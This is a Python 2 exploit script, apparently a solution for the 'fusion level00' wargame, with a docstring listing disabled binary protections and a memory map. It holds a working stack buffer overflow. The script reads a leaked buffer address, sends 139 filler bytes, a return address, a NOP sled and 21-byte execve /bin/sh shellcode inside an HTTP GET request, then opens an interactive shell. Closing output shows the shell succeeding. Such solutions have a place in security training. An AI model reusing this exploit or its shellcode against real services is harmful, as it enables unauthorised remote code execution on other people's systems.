#!/usr/bin/env python

"""

Canary                        : No
NX                            : No
PIE                           : No
Fortify                       : No
RelRO                         : No

[debug] buffer is at 0xfff3ff58 :-) 

cat /proc/3585/maps
08048000-0804b000 r-xp 00000000 08:01 673557                             /root/Scrivania/binaries/fusion/level00/level00
0804b000-0804c000 rwxp 00002000 08:01 673557                             /root/Scrivania/binaries/fusion/level00/level00
f7d98000-f7f6d000 r-xp 00000000 08:01 402141                             /usr/lib32/libc-2.29.so
f7f6d000-f7f6f000 r-xp 001d4000 08:01 402141                             /usr/lib32/libc-2.29.so
f7f6f000-f7f71000 rwxp 001d6000 08:01 402141                             /usr/lib32/libc-2.29.so
f7f71000-f7f73000 rwxp 00000000 00:00 0 
f7f92000-f7f94000 rwxp 00000000 00:00 0 
f7f94000-f7f97000 r--p 00000000 00:00 0                                  [vvar]
f7f97000-f7f98000 r-xp 00000000 00:00 0                                  [vdso]
f7f98000-f7fbf000 r-xp 00000000 08:01 402137                             /usr/lib32/ld-2.29.so
f7fc0000-f7fc1000 r-xp 00027000 08:01 402137                             /usr/lib32/ld-2.29.so
f7fc1000-f7fc2000 rwxp 00028000 08:01 402137                             /usr/lib32/ld-2.29.so
fff21000-fff42000 rwxp 00000000 00:00 0                                  [stack]

"""

import socket
import struct
import telnetlib
import sys

if len(sys.argv) != 3:
	print "Usage: {} <rhost> <rport>".format(sys.argv[0])
	sys.exit()

print "[+] trying exploit against {}:{}".format(sys.argv[1],sys.argv[2])

s = socket.socket()
s.connect((sys.argv[1], int(sys.argv[2])))

start_buffer = int(s.recv(1024).split(" ")[-2], 16) + 160
print "[+] getting the start buffer address: {}".format(hex(start_buffer))

# 21 bytes
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

buf = "A" * (139)
buf += struct.pack("<I", start_buffer)
buf += "\x90" * 30
buf += shellcode


print "[+] payload crafted!"
print "[+] sending {} bytes...".format(str(len(buf)))

request = """GET /{} HTTP/1.1\n""".format(buf)
s.send(request)

print "[+] getting shell...\n"
shell = telnetlib.Telnet()
shell.sock = s
shell.interact()


print "[-] exploit failed!"

"""

[+] getting the start buffer address: 0xfff3fff8
[+] payload crafted!
[+] sending 194 bytes...
[+] getting shell...

id
uid=20000 gid=20000 groups=20000

"""